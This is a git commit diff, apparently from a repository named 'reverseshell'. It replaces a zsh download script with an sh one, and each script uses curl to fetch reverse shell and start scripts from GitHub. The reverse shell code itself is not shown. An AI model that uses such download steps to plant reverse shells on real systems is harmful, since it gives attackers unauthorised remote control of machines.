d5b416ef378d632be4bd3673415ff5bec0f48534
mmilunicmobile <62996888+mmilunicmobile@users.noreply.github.com>
2022-02-15 08:56:46 -0500

    Change from zsh to sh for compatibility.

---
+++ download.sh
@@ -0,0 +1,2 @@
+curl -o reverseshell.sh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.sh
+curl -o start.sh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.sh
--- download.zsh
+++
@@ -1,2 +0,0 @@
-curl -o reverseshell.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.zsh
-curl -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
